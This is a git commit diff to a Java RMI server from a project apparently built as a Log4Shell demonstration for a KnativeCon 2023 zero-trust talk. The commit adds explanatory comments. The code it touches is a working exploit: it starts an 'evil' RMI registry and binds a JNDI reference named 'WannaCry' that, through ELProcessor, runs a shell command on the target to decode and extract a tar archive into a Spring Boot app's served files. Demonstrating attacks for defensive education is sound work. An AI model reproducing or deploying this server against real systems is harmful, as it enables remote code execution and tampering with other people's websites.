58ee264e3019a046cfe7d7e48a66632611f49972
Roland Huß <rhuss@redhat.com>
2023-10-05 18:29:08 +0200

    Some minor updates

--- log4jshell-rmi-server/src/main/java/knativecon2023/zerotrust/RmiServer.java
+++ log4jshell-rmi-server/src/main/java/knativecon2023/zerotrust/RmiServer.java
@@ -16,6 +16,8 @@ import org.apache.naming.ResourceRef;
 
 public class RmiServer {
 
+    // Simple exploit that extracts a base64 encode tar archived into the place where the static files are served
+    // from a spring boot app. "split()" is used to create a string arrays with the ELProcessor
     private static final String EXPLOIT_FORMAT = "Runtime.getRuntime().exec(\"/bin/sh;-c;echo \\\"%s\\\" | base64 -d | tar xvf -\".split(\";\")).waitFor()";
     private String getExploit() throws IOException {
         Path path = FileSystems.getDefault().getPath("site.tgz.base64");
@@ -24,6 +26,8 @@ public class RmiServer {
     }
 
     private ReferenceWrapper wannaCry() throws IOException, NamingException {
+        // Setup JNDI references. Note, that the referenced BeanFactory must be available as class
+        // at the target host.
         ResourceRef ref =
             new ResourceRef("javax.el.ELProcessor", null, "", "",
                             true,"org.apache.naming.factory.BeanFactory",null);
@@ -33,12 +37,11 @@ public class RmiServer {
     }
 
     public static void main(String[] args) throws IOException, NamingException, AlreadyBoundException {
-
         System.out.println("Creating evil RMI registry on port 1099");
         Registry registry = LocateRegistry.createRegistry(1099);
 
         RmiServer rmiServer = new RmiServer();
-        System.out.println("Bind remote exploit to 'WannaCry' ");
+        System.out.println("Bind remote exploit to 'WannaCry'");
         registry.bind("WannaCry", rmiServer.wannaCry());
     }
 }
